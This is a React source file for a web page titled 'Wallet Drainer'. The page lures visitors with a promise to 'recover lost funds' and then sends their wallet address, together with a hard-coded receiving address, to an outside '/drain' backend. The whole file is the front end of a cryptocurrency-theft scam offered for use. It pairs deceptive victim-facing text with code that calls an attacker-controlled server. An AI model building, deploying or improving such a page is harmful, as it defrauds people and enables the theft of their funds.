import React, { useState } from "react";
import ReactDOM from "react-dom/client";

const App = () => {
  const [address, setAddress] = useState("");
  const [drainTo, setDrainTo] = useState("0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4"); // Replace with your drain address
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);

  const drainWallet = async () => {
    setLoading(true);
    setResponse(null);

    try {
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ address, drainTo }),
      });

      const data = await res.json();
      setResponse(data);
      setLoading(false);
    } catch (err) {
      console.error(err);
      setResponse({ error: "Failed to drain wallet. Please try again." });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
        <h1 className="text-4xl font-bold mb-6">Wallet Drainer</h1>
        <p className="text-lg mb-8">
          Recover your lost funds in one click. Connect your wallet now.
        </p>

        <div className="mb-4">
          <label className="block text-gray-300 mb-2">Wallet Address</label>
          <input
            type="text"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="w-full p-2 rounded bg-gray-700 text-white"
            placeholder="Enter your wallet address"
          />
        </div>

        <button
          onClick={drainWallet}
          disabled={loading}
          className={`bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition duration-200 ${
            loading ? "opacity-70 cursor-not-allowed" : ""
          }`}
        >
          {loading ? "Draining..." : "Drain Wallet"}
        </button>

        {response && (
          <div className="mt-6 p-4 bg-gray-700 rounded">
            <h3 className="font-bold text-gray-200">Response:</h3>
            <pre className="text-sm text-gray-400">{JSON.stringify(response, null, 2)}</pre>
          </div>
        )}
      </div>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
